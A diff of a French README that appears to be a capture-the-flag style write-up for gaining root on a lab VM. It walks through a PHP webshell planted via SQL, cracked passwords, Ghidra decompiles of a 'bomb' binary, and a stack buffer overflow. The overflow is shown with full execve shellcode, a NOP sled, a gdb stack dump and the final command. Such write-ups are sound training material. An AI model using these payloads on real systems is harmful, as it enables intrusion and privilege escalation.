@@ -4,8 +4,6 @@
 Dans ce projet, l'objectif est d'acquérir les privilèges root sur une VM. Afin de valider la partie obligatoire du projet, il faut obtenir les privilèges root sur le serveur en utilisant deux méthodes différentes.
 Chaque méthode employée doit être accompagnée d'un compte rendu complet expliquant les différentes étapes pour devenir root sur le serveur.
 
-
-
 # Reconnaissance de la cible
 
 ## Création d'un Réseau Privé Hôte :
@@ -69,7 +67,7 @@ Cette commande SQL insère du code PHP malveillant `("<?php system($_GET['cmd'])
 
 ## Accès au Backdoor PHP : 
 
-On peut des a present inspecter le terminal en injectant un `ls` dans notre adresse :
+On peut des a present inspecter le terminal en injectant un `ls` dans notre lien :
 
     192.168.56.107/forum/templates_c/backdoor.php?cmd=ls%20/home
 
@@ -115,13 +113,21 @@ Les fichiers .pcap contenaient des extraits de code. Nous avons remarqué qu'il 
 
     /scripts/solution1/script.c
 
+Compilation du programme :
+
+    gcc -o script script.c -lssl -lcrypto
+
+Execution du programme :
+
+    ./script *.pcap
+
 Le mot de passe obtenu était :
     
     Iheartpwnage
     
 Le dernier "printf" nous indiquait de crypter le mot de passe en utilisant l'algorithme SHA-256 pour obtenir le mot de passe final.
 
-Nous avons utilisé un outil en ligne tel que "CyberChef" avec l'option SHA-256 pour obtenir le mot de passe de laurie en ssh :
+Le mot de passe hashe SHA-256 de laurie en ssh :
     
     330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
@@ -139,33 +145,245 @@ Après avoir établi la connexion, nous avons exécuté la commande "ls" pour vo
 
     README    bomb
 
-Fichier "README" : Ce fichier nous a fourni un indice sous forme de caractères et de chiffres, notamment `P, 2, b, , o, 4`. Ces caractères correspondent à certaines étapes dans la diffusion du défi.
+Fichier "README" : Ce fichier nous a fourni un indice sous forme de caractères et de chiffres, notamment 
+
+    P
+     2
+     b
+
+    o
+    4
+
+Ces caractères correspondent à certaines étapes dans la diffusion du défi.
 Fichier "bomb" : Il s'agit d'un exécutable binaire qui lance le défi.
 
 ### Utilisation de Ghidra : 
 Nous avons utilisé l'outil Ghidra pour désassembler le code C à partir du binaire "bomb". Cela nous a permis d'analyser le code et de trouver des solutions pour diffuser le défi.
 
+Voici le code source du main du binaire bomb :
+
+    int main(int argc,char **argv)
+    {
+        undefined4 uVar1;
+        int in_stack_00000004;
+        undefined4 *in_stack_00000008;
+        
+        if (in_stack_00000004 == 1) {
+            infile = stdin;
+        }
+        else {
+            if (in_stack_00000004 != 2) {
+            printf("Usage: %s [<input_file>]\n",*in_stack_00000008);
+                            /* WARNING: Subroutine does not return */
+            exit(8);
+            }
+            infile = (_IO_FILE *)fopen((char *)in_stack_00000008[1],"r");
+            if ((FILE *)infile == (FILE *)0x0) {
+            printf("%s: Error: Couldn\'t open %s\n",*in_stack_00000008,in_stack_00000008[1]);
+                            /* WARNING: Subroutine does not return */
+            exit(8);
+            }
+        }
+        initialize_bomb(argv);
+        printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
+        printf("only one life good luck !! Have a nice day!\n");
+        uVar1 = read_line();
+        phase_1(uVar1);
+        phase_defused();
+        printf("Phase 1 defused. How about the next one?\n");
+        uVar1 = read_line();
+        phase_2(uVar1);
+        phase_defused();
+        printf("That\'s number 2.  Keep going!\n");
+        uVar1 = read_line();
+        phase_3(uVar1);
+        phase_defused();
+        printf("Halfway there!\n");
+        uVar1 = read_line();
+        phase_4(uVar1);
+        phase_defused();
+        printf("So you got that one.  Try this one.\n");
+        uVar1 = read_line();
+        phase_5(uVar1);
+        phase_defused();
+        printf("Good work!  On to the next...\n");
+        uVar1 = read_line();
+        phase_6(uVar1);
+        phase_defused();
+        return 0;
+    }
+
 ## Phase 1 : 
 La première phase ne fait qu'une comparaison de chaînes de caractères avec la string `Public speaking is very easy.`
+
+    void phase_1(undefined4 param_1)
+    {
+        int iVar1;
+        
+        iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
+        if (iVar1 != 0) {
+            explode_bomb();
+        }
+        return;
+    }
+
+Solution :
 
     Public speaking is very easy.
 
 ## Phase 2 : 
 La fonction phase 2 verifie qu'il y a bien 6 entier rentrees. Le code nous dit que le premier element est 1 et l'indice nous dit que le deuxieme est 2. 
-Grace a l'algo de verification on en deduit : `tab[i + 1] != (i + 1) * tab[i]`.
+
+    void phase_2(undefined4 param_1)
+    {
+        int iVar1;
+        int aiStack_20 [7];
+        
+        read_six_numbers(param_1,aiStack_20 + 1);
+        if (aiStack_20[1] != 1) {
+            explode_bomb();
+        }
+        iVar1 = 1;
+        do {
+            if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
+                explode_bomb();
+            }
+            iVar1 = iVar1 + 1;
+        } while (iVar1 < 6);
+        return;
+    }
+
+Grace a la condition de verification on en deduit : `tab[i + 1] != (i + 1) * tab[i]`.
+Donc le nombre d'apres dans la suite doit etre egale a : position + 1 * nombre actuel
+
+    1
+    (1+1) * 1 = 2
+    (2+1) * 2 = 6
+    (3+1) * 6 = 24
+    (4+1) * 24 = 120
+    (5+1) * 120 = 720``
 
     1 2 6 24 120 720
 
 ## Phase 3 : 
-La fonction phase 3 verifie au'il y a 3 elements en entree (uint char int). Le switch case a partir du premier entier nous indique qu'il doit etre entre 0 et 7. Ensuite plusieurs combinaisons sont possibles. Sachant que l'indice est deuxieme caractere = 'b', Il y a trois combinaisons possibles.
+La fonction phase 3 verifie qu'il y a 3 elements en entree (uint char int). 
+
+    void phase_3(char *param_1)
+    {
+        int iVar1;
+        char cVar2;
+        uint local_10;
+        char local_9;
+        int local_8;
+        
+        iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
+        if (iVar1 < 3) {
+            explode_bomb();
+        }
+        switch(local_10) {
+        case 0:
+            cVar2 = 'q';
+                if (local_8 != 0x309) {
+                explode_bomb();
+                }
+            break;
+        case 1:
+            cVar2 = 'b';
+                if (local_8 != 0xd6) {
+                explode_bomb();
+                }
+            break;
+        case 2:
+            cVar2 = 'b';
+                if (local_8 != 0x2f3) {
+                explode_bomb();
+                }
+            break;
+        case 3:
+            cVar2 = 'k';
+                if (local_8 != 0xfb) {
+                explode_bomb();
+                }
+            break;
+        case 4:
+            cVar2 = 'o';
+                if (local_8 != 0xa0) {
+                explode_bomb();
+                }
+            break;
+        case 5:
+            cVar2 = 't';
+                if (local_8 != 0x1ca) {
+                explode_bomb();
+                }
+            break;
+        case 6:
+            cVar2 = 'v';
+                if (local_8 != 0x30c) {
+                explode_bomb();
+                }
+            break;
+        case 7:
+            cVar2 = 'b';
+                if (local_8 != 0x20c) {
+                explode_bomb();
+                }
+            break;
+        default:
+            cVar2 = 'x';
+            explode_bomb();
+        }
+        if (cVar2 != local_9) {
+            explode_bomb();
+        }
+    return;
+    }
+
+
+Le switch case a partir du premier entier nous indique qu'il doit etre entre 0 et 7.
+Ensuite plusieurs combinaisons sont possibles. Sachant que l'indice est deuxieme caractere = 'b', Il y a trois combinaisons possibles.
 On choisit la premiere possible, c'est a dire :
 
     1 b 214
 
 ## Phase 4 : 
 La fonction phase 4 verifie qu'il y a seulement un parametre et qu'il est superieur ou egale a 1
+
+    void phase_4(char *param_1)
+    {
+        int iVar1;
+        int local_8;
+        
+        iVar1 = sscanf(param_1,"%d",&local_8);
+        if ((iVar1 != 1) || (local_8 < 1)) {
+            explode_bomb();
+        }
+        iVar1 = func4(local_8);
+        if (iVar1 != 0x37) {
+            explode_bomb();
+        }
+        return;
+    }
+
 Func 4 appelle dans phase4, verifie que le nombre est superieur a 2 sinon c'est pas bon
-Cette func4 implemente la suite de fibonacci. Dans phase4, le retour de la fonction doit etre 55 sinon ca explose. 
+Cette fonction implemente la suite de fibonacci. Dans phase4, le retour de la fonction doit etre 55 sinon ca explose. 
+
+    int func4(int param_1)
+    {
+        int iVar1;
+        int iVar2;
+        
+        if (param_1 < 2) {
+            iVar2 = 1;
+        }
+        else {
+            iVar1 = func4(param_1 + -1);
+            iVar2 = func4(param_1 + -2);
+            iVar2 = iVar2 + iVar1;
+        }
+        return iVar2;
+    }
+
 On en deduit que le nombre doit etre 9 (car la suite demarre a F(1) donc `F(10) = F(9)`) en entree pour obtenir 55 selon la suite de fibonacci.
 
     9
@@ -173,6 +391,30 @@ On en deduit que le nombre doit etre 9 (car la suite demarre a F(1) donc `F(10) 
 
 ## Phase 5 : 
 La fonction phase 5 verifie que la string envoye est de longueur egale a 6 sinon ca explose. Une boucle rempli un tableau de char selon une logique.
+
+    void phase_5(int param_1)
+    {
+        int iVar1;
+        undefined local_c [6];
+        undefined local_6;
+        
+        iVar1 = string_length(param_1);
+        if (iVar1 != 6) {
+            explode_bomb();
+        }
+        iVar1 = 0;
+        do {
+            local_c[iVar1] = (&array.123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
+            iVar1 = iVar1 + 1;
+        } while (iVar1 < 6);
+        local_6 = 0;
+        iVar1 = strings_not_equal(local_c,"giants");
+        if (iVar1 != 0) {
+            explode_bomb();
+        }
+        return;
+    }
+
 Une fonction interne verifie si l'element est different de la string "giants" alors ca explose. Donc il faut que param_1 apres traitement soit egale a "giants".
 Pour cela il nous faut comprendre l'algorithme. Dans une boucle de 5-6 tours, le programme attribut a chaque index d'un tableau d'int une valeur. Cette valeur est `string[param1[i] & 0xf]`. L'operation `& 0xf` effectue sur `param1[i]` permet de garder seulement les bits de poids faible. Le code ne nous permet pas d'avoir acces aux valeurs de strings qui nous permettera mieux de comprendre les valeurs attendus.
 
@@ -192,13 +434,139 @@ On obtient
 Soit un contenu "isrveawhobpnutfg" de taille 16.
 Apres cela on peut deduire qu'il faut arriver a ecrire "giants" a partir de string[16] avec cette operation string[param1[i] & 0xf] ou param1[i] est la chaine de caracteres de longueur 6.
 
+    'o' = 01101111 & 0xf = 1111 = 15    =>      string[15] = 'g'
+    'p' = 01110000 & 0xf = 0000 = 0     =>      string[0] = 'i'
+    'e' = 01100101 & 0xf = 0101 = 5     =>      string[5] = 'a'
+    'k' = 01101011 & 0xf = 1011 = 11    =>      string[11] = 'n'
+    'm' = 01101101 & 0xf = 1101 = 13    =>      string[13] = 't'
+    'q' = 01110001 & 0xf = 0001 = 1     =>      string[1] = 's'
+
+
     opekmq
 
 ## Phase 6 : 
 La fonction phase 6 verifie que 6 entiers sont rentrees en parametre sinon c'est pas bon.
 L'indice pour celui ci est 4 pour le premier chiffre.
+
+    void phase_6(undefined4 param_1)
+    {
+        int *piVar1;
+        int iVar2;
+        int *piVar3;
+        int iVar4;
+        undefined1 *local_38;
+        int *local_34 [6];
+        int local_1c [6];
+        
+        local_38 = node1;
+        read_six_numbers(param_1,local_1c);
+        iVar4 = 0;
+        do {
+            iVar2 = iVar4;
+            if (5 < local_1c[iVar4] - 1U) {
+            explode_bomb();
+            }
+            while (iVar2 = iVar2 + 1, iVar2 < 6) {
+            if (local_1c[iVar4] == local_1c[iVar2]) {
+                explode_bomb();
+            }
+            }
+            iVar4 = iVar4 + 1;
+        } while (iVar4 < 6);
+        iVar4 = 0;
+        do {
+            iVar2 = 1;
+            piVar3 = (int *)local_38;
+            if (1 < local_1c[iVar4]) {
+            do {
+                piVar3 = (int *)piVar3[2];
+                iVar2 = iVar2 + 1;
+            } while (iVar2 < local_1c[iVar4]);
+            }
+            local_34[iVar4] = piVar3;
+            iVar4 = iVar4 + 1;
+        } while (iVar4 < 6);
+        iVar4 = 1;
+        piVar3 = local_34[0];
+        do {
+            piVar1 = local_34[iVar4];
+            piVar3[2] = (int)piVar1;
+            iVar4 = iVar4 + 1;
+            piVar3 = piVar1;
+        } while (iVar4 < 6);
+        piVar1[2] = 0;
+        iVar4 = 0;
+        do {
+            if (*local_34[0] < *(int *)local_34[0][2]) {
+            explode_bomb();
+            }
+            local_34[0] = (int *)local_34[0][2];
+            iVar4 = iVar4 + 1;
+        } while (iVar4 < 5);
+        return;
+    }
+
 La premiere boucle verifie que chacun des 6 chiffres n'est pas superieur a 6 (si 5 < chiffre - 1, ca pete). Et elle verifie qu'aucun des chiffres soit similaire.
-Une autre boucle attribut des valeurs en fonction de notre chiffre rentre en parametre et les trie selon un ordre.
+
+    local_38 = node1; // Initialisation de local_38 au node 1
+    read_six_numbers(param_1, local_1c); // Lecture de six nombres depuis param_1 dans local_1c
+
+    iVar4 = 0;
+    do {
+        iVar2 = iVar4;
+        if (5 < local_1c[iVar4] - 1U) {
+            explode_bomb();
+        }
+        while (iVar2 = iVar2 + 1, iVar2 < 6) {
+            if (local_1c[iVar4] == local_1c[iVar2]) {
+                explode_bomb();
+            }
+        }
+        iVar4 = iVar4 + 1;
+    } while (iVar4 < 6);
+
+Une autre boucle crée une liste chaînée à partir du tableau local_1c. 
+Cette boucle itère sur les éléments du tableau local_1c et construit une liste chaînée stockée dans le tableau local_34.
+En fonction de notre input n de 1 a 6, la valeur sera egale au noeud de la liste numero n
+
+    iVar4 = 0;
+    do {
+        iVar2 = 1;
+        piVar3 = (int *)local_38;
+        if (1 < local_1c[iVar4]) {
+            do {
+                piVar3 = (int *)piVar3[2];
+                iVar2 = iVar2 + 1;
+            } while (iVar2 < local_1c[iVar4]);
+        }
+        local_34[iVar4] = piVar3;
+        iVar4 = iVar4 + 1;
+    } while (iVar4 < 6);
+
+Cette boucle suivante réorganise les nœuds dans une liste chaînée pour que chaque nœud soit relié au nœud suivant dans l'ordre, tout en maintenant la fin de la liste
+
+    iVar4 = 1;
+    piVar3 = local_34[0];
+    do {
+        piVar1 = local_34[iVar4];
+        piVar3[2] = (int)piVar1;
+        iVar4 = iVar4 + 1;
+        piVar3 = piVar1;
+    } while (iVar4 < 6);
+    piVar1[2] = 0;
+
+La dernière boucle do...while parcourt la liste chaînée pour vérifier si les éléments sont triés par ordre croissant.
+Si la vérification échoue, la fonction appelle explode_bomb
+
+    iVar4 = 0;
+    do {
+        if (*local_34[0] < *(int *)local_34[0][2]) {
+            explode_bomb();
+        }
+        local_34[0] = (int *)local_34[0][2];
+        iVar4 = iVar4 + 1;
+    } while (iVar4 < 5);
+
 Une ligne dans la fonction nous interesse : `local_38 = node1`.
 Cette variable semble pointee vers une structure chainee.
 Si on rentre dans gdb, et qu'on affiche les nodes voila ce qu'on obtient :
@@ -222,18 +590,21 @@ Donc la reponse est :
 
     4 2 6 3 1 5
 
-Apparement il y a un soucis dans le sujet donc la vrai reponse est :
-    
-    4 2 6 1 3 5
-
-
 Apres toutes ces etapes on peut creer le mot de passe final pour 'thor' :
 
+    Publicspeakingisveryeasy.126241207201b2149opekmq426315
+
+Apparement il y a un soucis dans le sujet, le 1 et le 3 de la phase 6 doivent etre inverses, donc la vrai reponse est :
+    
     Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 ## Thor
 
-Pour établir une connexion SSH avec `thor@192.168.56.107`, nous avons découvert un fichier nommé "turtle" qui contenait des instructions à suivre. Il est apparu que le terme "turtle" faisait référence à la bibliothèque Python "turtle", utilisée pour le dessin graphique.
+Pour établir une connexion SSH
+
+    ssh thor@192.168.56.107
+
+Nous avons découvert un fichier nommé "turtle" qui contenait des instructions à suivre. Il est apparu que le terme "turtle" faisait référence à la bibliothèque Python "turtle", utilisée pour le dessin graphique.
 
 En exécutant un script Python associé à la bibliothèque "turtle", nous avons obtenu la chaîne de caractères "SLASH". 
 
@@ -251,96 +622,68 @@ Lors de notre accès au profil, nous avons remarqué la présence de deux élém
 
 Pour mieux comprendre le fonctionnement de "exploit_me", nous avons utilisé Ghidra pour analyser le code source en langage C. Dans la fonction "main", nous avons identifié qu'un argument fourni serait copié dans un tableau de caractères de taille 140, puis affiché à l'aide de la fonction "puts()".
 
+    bool main(int param_1,int param_2)
+    {
+        char local_90 [140];
+        
+        if (1 < param_1) {
+            strcpy(local_90,*(char **)(param_2 + 4));
+            puts(local_90);
+        }
+        return param_1 < 2;
+    }
+
 ### Buffer overflow
 
 `Le dépassement de tampon (buffer overflow) se produit lorsqu'un programme écrit dans un tampon de mémoire (une zone de stockage temporaire) qui dépasse la taille prévue du tampon, écrasant ainsi la mémoire adjacente. Cela peut entraîner des comportements indésirables, notamment des plantages de programmes, des erreurs de sécurité et, potentiellement, des exécutions de code non autorisées.`
 
 La limite de 140 caractères du tampon nous a conduit à envisager l'exploitation d'un débordement de tampon, qui pourrait nous permettre d'obtenir un accès au terminal en tant qu'utilisateur "root", étant donné que "exploit_me" est exécuté avec des privilèges "root".
-
 Pour réussir cette attaque, nous avons d'abord désactivé l'ASLR (Address Space Layout Randomization) en vérifiant la valeur de la commande :
 
     cat /proc/sys/kernel/randomize_va_space
 
 Si la réponse est `0`, cela signifie que l'ASLR est désactivé.
 
-Ensuite, nous avons généré une chaîne de caractères de 140 caractères avec la syntaxe Python : 
+Pour executer un shell, nous allons utiliser un programme ecrit shellcode et qui a une taille de 45 octets.
 
-    python -c 'print "0" * 140'
+    \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 
-Cette chaîne de caractères serait utilisée pour provoquer un débordement de tampon.
+Sachant que le buffer est de 140 avec un depassement de +1 pour tomber sur l'adresse de retour ecrit dans EIP.
+Le but ici va etre d'ecraser le registre EIP (responsable du retour d'instruction) avec une des adresse de la stack qui contient la chaine d'instruction '\x90\x90\x90...' que l'on injectera avant le shellcode /bin/sh.
+L'instruction shellcode '\x90' est utilise pour passer a l'adresse suivante dans la stack.
+On peut alors ecrire 95 octets d'instructions '\x90' + le shellcode de 45 octets pour faire 140 octets de payload
 
-L'objectif principal de cette attaque par débordement de tampon est d'obtenir un accès au terminal en tant qu'utilisateur "root".
+    python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "[adresse EIP a remplacer par une des adresse de la stack contenant l'instruction '\x90']"'
 
-Pour atteindre cet objectif, nous avons cherché à exécuter "/bin/sh" en utilisant la commande "system" qui permet de faire des appels systemes. Pour ce faire, nous avons construit une structure de paramètres : [buffer de débordement] [adresse de "system()"] [adresse de retour] [adresse de "/bin/sh"].
+Cela va nous permettre de faire retourner le programme sur une instruction '\x90' qui va defiler jusqu'a tomber sur le shellcode /bin/sh et l'executer.
+On execute le programme dans gdb et on met un breakpoint juste apres le strcpy pour voir l'etat de la stack :
 
-Pour obtenir l'adresse de "system", nous avons utilisé GDB en plaçant un point d'arrêt sur "main", en lançant le programme et en affichant la valeur de "system".
+    (gdb) b *main+56
 
-    gdb exploit_me
-    b main
-    r
-    p system
+    (gdb) r $(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "AAAA"')
 
-On recupere l'adresse de system : 
+    Breakpoint 1, 0x0804842c in main ()
 
-    0xb7e6b060
+    (gdb) x/100x $esp
+    0xbffff630:	0xbffff640	0xbffff899	0x00000001	0xb7ec3c49
+    0xbffff640:	0x90909090	0x90909090	0x90909090	0x90909090 <===== Debut du buffer avec les instructions '\x90'
+    0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
+    0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
+    0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090 <===== Adresse choisit 0xbffff670
+    0xbffff680:	0x90909090	0x90909090	0x90909090	0x90909090
+    0xbffff690:	0x90909090	0x90909090	0x90909090	0xeb909090 <===== Debut du shellcode executant /bin/sh
+    0xbffff6a0:	0x76895e1f	0x88c03108	0x46890746	0x890bb00c
+    0xbffff6b0:	0x084e8df3	0xcd0c568d	0x89db3180	0x80cd40d8
+    0xbffff6c0:	0xffffdce8	0x69622fff	0x68732f6e	0x41414141 <===== Registre EIP (41414141 pour AAAA injecte en argument)
 
-Nous avons également trouvé l'adresse de "/bin/sh" en utilisant la commande "find" :
+On choisit l'adresse 0xbffff670 de la stack pour la mettre dans le registre EIP.
 
-    find __libc_start_main,+99999999,"/bin/sh"
-    0xb7f8cc58
-
-ou en inspectant les plages d'adresses avec "info proc map" dans GDB :
-
-    (gdb) info proc map
-
-    Mapped address spaces:
-
-	Start Addr   End Addr       Size     Offset objfile
-	0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
-	0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
-	0xb7e2b000 0xb7e2c000     0x1000        0x0 
-	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fd2000 0xb7fd5000     0x3000        0x0 
-	0xb7fdb000 0xb7fdd000     0x2000        0x0 
-	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
-	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
-	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
-	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
-	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
-
-    
-On cible un interval d'adresse au niveau de la libc pour chercher /bin/sh */
-
-    ==> 0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-
-    (gdb) find 0xb7fcf000, 0x1a3000,"/bin/sh"
-    0xb7f8cc58
-
-Il faut transformer ces adresses en écriture de shellcode
-
-Adresse de "system" :
-
-    0xb7e6b060 => \x60\xb0\xe6\xb7
-
-Adresse de "/bin/sh" :
-
-    0xb7f8cc58 => \x58\xcc\xf8\xb7
-
-Voici le shellcode à intégrer en argument après le buffer overflow :
-
-    "\x60\xb0\xe6\xb7" + "0000" + "\x58\xcc\xf8\xb7"
-
-"System" permet de faire appel à des fonctions système. Il attend en arguments dans la pile l'adresse de retour de la fonction ainsi que l'adresse de la fonction elle-même.
-
-D'où le shellcode respectant l'ordre [system] + [adresse de retour] + [adresse /bin/sh]. Dans notre cas, il n'est pas important de donner l'adresse de retour de la fonction, cela entrainera seulement un segmentation fault au depart de notre shell "root".
-
-### Élévation des privilèges
+    \x70\xf6\xff\xbf
 
 Enfin, nous avons exécuté la commande finale suivante :
 
-    ./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "0000" + "\x58\xcc\xf8\xb7")'`
+    ./exploit_me $(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x70\xf6\xff\xbf"')
+### Élévation des privilèges
 
 Cette commande a ouvert un shell en tant qu'utilisateur "root". En utilisant la commande "whoami", nous avons confirmé que nous avions obtenu les privilèges "root".
 
